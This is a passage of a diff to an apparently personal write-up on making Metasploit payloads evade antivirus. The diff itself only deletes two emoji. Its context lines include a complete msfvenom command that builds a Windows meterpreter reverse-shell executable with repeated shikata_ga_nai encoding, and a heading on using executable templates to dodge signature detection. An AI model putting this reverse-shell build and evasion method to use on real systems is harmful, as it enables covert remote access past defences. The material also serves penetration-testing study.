@@ -55,7 +55,7 @@ A way to combat my malware being known is by using a no distribution scanner.
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o payload2.exe -e x86/shikata_ga_nai -i 9
 ```
 ![msfvenom-virtustotal-payload-2](<msfvenom-virtustotal-payload-2.png>)
-Doesn't even lower it by much 😭😭
+Doesn't even lower it by much 
 
 4. Giving it a executable to encode with the template to mask out anti-malware signature detection
 ```bash
